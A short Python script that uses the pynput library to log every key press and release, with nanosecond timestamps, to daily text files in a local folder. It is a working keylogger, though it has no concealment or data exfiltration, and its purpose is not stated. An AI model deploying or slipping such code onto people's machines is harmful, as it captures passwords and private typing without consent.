from pynput.keyboard import Listener
from pathlib import Path
from time import monotonic_ns
from datetime import date

directory = Path("logs/")

def log_entry(action, key):
    file_name = str(date.today()) + ".txt"
    file_path = directory / file_name
    time = monotonic_ns()
    msg = ' - '.join(map(str, [time, action, key]))
    with file_path.open("a", buffering=1, encoding="utf-8") as f:
        f.write(f"{msg}\n")

def on_press(key):
    log_entry("pressed", key)

def on_release(key):
    log_entry("released", key)

# Setup to run the on_press function when a keyboard key is pressed
with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()